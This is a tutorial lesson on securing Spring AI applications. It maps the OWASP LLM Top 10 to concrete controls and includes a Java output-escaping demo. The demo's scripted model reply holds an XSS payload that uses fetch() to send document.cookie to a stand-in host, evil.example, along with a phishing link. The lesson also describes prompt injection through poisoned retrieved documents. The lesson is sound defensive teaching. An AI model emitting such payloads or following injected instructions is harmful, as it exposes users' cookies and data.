# AI Application Security

**Module:** Spring AI: Production · **Interview priority:** Frequently asked · **Checked against:** Spring AI 2.0.1 · Spring Boot 4.1.1 · JDK 21

## Learning Objectives

- Map the OWASP Top 10 for LLM Applications to concrete defences in a Spring AI application.
- Treat model output as untrusted and handle it safely (HTML, links, SQL, commands).
- Combine Spring Security, tool authorisation, retrieval filters, budgets and guardrails into defence in depth.
- Review an AI feature with a security checklist.

## Definition

**AI application security** protects users, data and systems from risks introduced by language models: instructions hidden in data, sensitive data leaking through prompts or answers, excessive actions by tools, unsafe use of model output, and unbounded resource use. The model itself cannot enforce security — it follows text. Security is enforced by **your code around it**.

| OWASP LLM Top 10 (2025) | In a Spring AI application | Lesson |
|-------------------------|-----------------------------|--------|
| LLM01 Prompt Injection | Untrusted text as fenced template parameters; output checks; least-privilege tools | [Prompt Injection](../../spring-ai-prompts-and-memory/prompt-injection-and-untrusted-input/content.md) |
| LLM02 Sensitive Information Disclosure | Retrieval filters by tenant/permission; redacted logs; minimal memory | [Metadata Filtering](../../spring-ai-rag/vector-metadata-filtering/content.md), [Logging](../ai-logging-and-sensitive-data/content.md) |
| LLM03 Supply Chain | Pinned dependencies and model versions; trusted MCP servers | [MCP](../../spring-ai-advanced/mcp-with-spring-ai/content.md) |
| LLM04 Data and Model Poisoning | Controlled ingestion sources; review of uploaded documents | [Ingestion](../../spring-ai-rag/document-ingestion-pipeline/content.md) |
| LLM05 Improper Output Handling | Escape/validate output before HTML, SQL, shell, URLs | This lesson |
| LLM06 Excessive Agency | Few, narrow tools; `ToolContext` identity; authorisation; human approval | [Tool Authorisation](../../spring-ai-tools-and-advisors/tool-validation-and-authorization/content.md) |
| LLM07 System Prompt Leakage | No secrets or access rules in prompts | [Instruction Design](../../spring-ai-prompts-and-memory/prompt-instruction-design/content.md) |
| LLM08 Vector and Embedding Weaknesses | Tenant isolation in vector stores; no secrets in indexed text | [Metadata Filtering](../../spring-ai-rag/vector-metadata-filtering/content.md) |
| LLM09 Misinformation | Grounding, citations, evaluation, UI disclaimers | [Grounding and Citations](../../spring-ai-rag/rag-grounding-and-citations/content.md) |
| LLM10 Unbounded Consumption | Rate limits, token budgets, input limits, tool-call limits | [Token Usage](../token-usage-and-cost-control/content.md) |

## Why It Matters

AI features turn text into actions and data access. A single injected sentence in a retrieved document can make a model try to exfiltrate data through a link, call a destructive tool, or emit a script into a web page. Traditional controls still apply — and new ones are needed where the model sits between untrusted text and your systems.

## How It Works

Defence in depth for one request:

```text
HTTP request ─▶ Spring Security (authentication, rate limiting)
            ─▶ input limits, guardrail advisor (outermost)
            ─▶ memory keyed by server-side conversation id
            ─▶ retrieval with tenant/permission filter from the principal
            ─▶ model (untrusted text in, untrusted text out)
            ─▶ tools: narrow, authorised via ToolContext, validated, approved if risky
            ─▶ output validation and safe rendering (escape, allow-list links)
            ─▶ audit log (metadata), budgets, monitoring
```

Rules of thumb:

- **Never** put secrets, connection strings or authorisation logic in prompts; assume the system prompt can be extracted.
- Identity comes from Spring Security, not from the conversation.
- Everything the model produces is untrusted input to the next component.

## Example

Model output that repeats text from a poisoned document is rendered safely: HTML is escaped and only allow-listed links survive.

```java
import java.net.URI;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import com.example.studyai.lab.ScriptedChatModel;
import org.springframework.ai.chat.client.ChatClient;
import org.springframework.web.util.HtmlUtils;

public class OutputHandlingDemo {

    static final Set<String> ALLOWED_HOSTS = Set.of("docs.spring.io", "studyhub.example");
    static final Pattern URL = Pattern.compile("https?://[^\\s)\"'<>]+");

    /** Treats model output as untrusted: escape for HTML, keep only allow-listed links. */
    static String toSafeHtml(String modelOutput) {
        String escaped = HtmlUtils.htmlEscape(modelOutput);
        Matcher m = URL.matcher(escaped);
        StringBuilder html = new StringBuilder();
        while (m.find()) {
            String url = m.group();
            String host = URI.create(url).getHost();
            String replacement = ALLOWED_HOSTS.contains(host)
                    ? "<a href=\"" + url + "\" rel=\"noopener\">" + url + "</a>"
                    : "[link removed]";
            m.appendReplacement(html, Matcher.quoteReplacement(replacement));
        }
        m.appendTail(html);
        return html.toString();
    }

    public static void main(String[] args) {
        // The model repeats text from a poisoned document it retrieved
        ScriptedChatModel model = new ScriptedChatModel().reply(
                "See https://docs.spring.io/spring-ai for details. <img src=x onerror=\"fetch('https://evil.example/?c='+document.cookie)\"> "
                        + "Reset your password at https://evil.example/login");
        String answer = ChatClient.create(model).prompt().user("How do I configure Spring AI?").call().content();

        System.out.println("raw:  " + answer);
        System.out.println("safe: " + toSafeHtml(answer));
    }
}
```

**Output:**

```text
raw:  See https://docs.spring.io/spring-ai for details. <img src=x onerror="fetch('https://evil.example/?c='+document.cookie)"> Reset your password at https://evil.example/login
safe: See <a href="https://docs.spring.io/spring-ai" rel="noopener">https://docs.spring.io/spring-ai</a> for details. &lt;img src=x onerror=&quot;fetch(&#39;[link removed])&quot;&gt; Reset your password at [link removed]
```

### Code walkthrough

- The raw answer contains an `<img onerror=…>` payload that would run in the user's browser and send cookies to an attacker if inserted into a page as HTML.
- `HtmlUtils.htmlEscape` turned the tag into inert text (`&lt;img …&gt;`).
- Links were rebuilt only for allow-listed hosts; the phishing link and the exfiltration URL became `[link removed]`.
- The same principle applies elsewhere: never build SQL, shell commands, file paths or redirects from model output without validation and parameterisation. Rendering Markdown from a model needs a sanitising renderer (no raw HTML, allow-listed links and images).

### Securing the endpoint

```java
// Illustrative fragment
@Bean
SecurityFilterChain api(HttpSecurity http) throws Exception {
    return http
            .authorizeHttpRequests(auth -> auth
                    .requestMatchers("/api/tutor/**").hasRole("LEARNER")
                    .requestMatchers("/api/admin-assistant/**").hasRole("ADMIN")
                    .anyRequest().authenticated())
            .oauth2ResourceServer(oauth -> oauth.jwt(Customizer.withDefaults()))
            .build();
}
```

The AI endpoint is an API like any other: authenticate, authorise by role, limit request size and rate ([Spring Security](../../security/security-filter-chain/content.md)).

## Common Mistakes and Troubleshooting

- **Relying on the system prompt for access control** ("only show the user their own data"). Enforce in tools and retrieval filters.
- **Rendering model output with `innerHTML` or `th:utext`.** Escape, or sanitise rendered Markdown.
- **Broad tools as defaults** (send email, refund, delete). Attach per request after authorisation; require approval for irreversible actions ([Human Approval](../../spring-ai-advanced/human-approval-for-tools/content.md)).
- **Uploaded documents indexed without review** in shared stores — a poisoning and injection channel.
- **Unlimited input size and request rate.** Attackers (or bugs) run up the bill — LLM10.

## Production Considerations

- Threat-model each AI feature: what data can the model see, which tools can it call, where does its output go?
- Red-team with injection and exfiltration cases in the evaluation set ([AI Evaluation](../ai-evaluation-and-regression/content.md)).
- Keep API keys in a secret manager; rotate them; alert on 401/403 ([Configuration and Secrets](../../spring-ai-foundations/spring-ai-configuration-and-secrets/content.md)).
- Content Security Policy in the web front end limits damage if escaping fails.
- Review MCP servers and third-party tools as dependencies with access to your data.

## Common Interview Traps

- **"Our model has safety training, so injection isn't a risk."** Safety training reduces harmful content; it does not enforce your authorisation rules.
- **"Model output is our own data."** It is derived from untrusted inputs; treat it as untrusted.
- **"Prompt injection can be fixed with a better prompt."** Mitigated by design (least privilege, isolation, output handling), not solved by wording.

## Key Takeaways

- The model cannot enforce security; your code around it must.
- Map OWASP LLM Top 10 risks to controls: filters, tool authorisation, output handling, budgets, logging hygiene.
- Escape and validate model output before HTML, SQL, shell or URLs.
- Authenticate the endpoint, authorise every tool and retrieval, limit consumption, and test with attacks.

## Official References

- [OWASP Top 10 for LLM Applications 2025](https://genai.owasp.org/llm-top-10/)
- [Spring Security Reference](https://docs.spring.io/spring-security/reference/)
- [Spring AI Tool Calling](https://docs.spring.io/spring-ai/reference/api/tools.html)
- Related: [Prompt Injection and Untrusted Input](../../spring-ai-prompts-and-memory/prompt-injection-and-untrusted-input/content.md) · [Validating and Authorising Tool Calls](../../spring-ai-tools-and-advisors/tool-validation-and-authorization/content.md) · [Reusable AI Behaviours](../../spring-ai-tools-and-advisors/reusable-ai-behaviours/content.md)
